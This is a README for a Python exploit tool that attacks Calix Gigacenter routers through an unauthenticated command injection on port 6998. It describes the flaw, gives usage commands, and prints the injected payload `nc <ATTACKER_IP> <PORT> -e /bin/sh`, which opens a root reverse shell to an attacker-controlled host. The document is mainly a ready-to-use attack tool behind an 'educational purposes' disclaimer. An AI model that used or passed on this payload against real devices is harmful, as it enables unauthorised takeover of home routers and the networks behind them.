
# 📡 Calix Gigacenter Pre-Auth RCE Exploit (Port 6998)

This Python-based exploit targets Calix Gigacenter devices (812Gv2 / 5VT Series), leveraging a **pre-authenticated remote code execution (RCE)** vulnerability exposed via TCP **port 6998** which cwmp component is listening on. Successful exploitation leads to a reverse shell.

## 🔍 Vulnerability Details

The CLI exposed on port 6998 accepts unauthenticated input, which is improperly sanitized. By injecting a command wrapped in backticks (`` `command` ``), an attacker can achieve arbitrary command execution on the target device.

- The vulnerability affects **Calix Gigacenter 812Gv2** and **5VT Series**.
- The flaw allows execution of commands as root, without credentials.
- Reference:  
  - [SSD Disclosure Advisory](https://ssd-disclosure.com/ssd-advisory-calix-pre-auth-rce/)  
  - [CyberPress Article](https://cyberpress.org/calix-pre-auth-rce-port-6998/)

## 🚀 Exploit Features

- Written in Python using `pwntools`.
- Spawns a reverse shell automatically via netcat.
- Uses a threaded listener to catch the shell.
- Logging included (via `logging` module) instead of `print()`.

## 🧠 Requirements

- Python 3.x
- [`pwntools`](https://docs.pwntools.com/en/stable/)
  ```bash
  pip install pwntools
  ```

## ⚙️ Usage

```bash
python3 Gigacenter.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>
```

### Example:

```bash
python3 Gigacenter.py 192.168.1.1 192.168.1.100 4444
```
![rce](https://github.com/user-attachments/assets/efbcf128-ae1b-4de8-bfaf-148709ab1c4c)


Make sure to have `nc -lvnp 4444` running or let the script handle the listener itself.

## 💀 Exploit Flow

1. Connects to the target on port 6998.
2. Spawns a thread that listens for reverse shell connection.
3. Sends the RCE payload:  
   ```
   `nc <ATTACKER_IP> <PORT> -e /bin/sh`
   ```
4. Interacts with the received shell.

## ⚠️ Legal Disclaimer

This code is provided for **educational and research purposes only**. Unauthorized access to systems is illegal and unethical. The author is not responsible for any misuse.

---
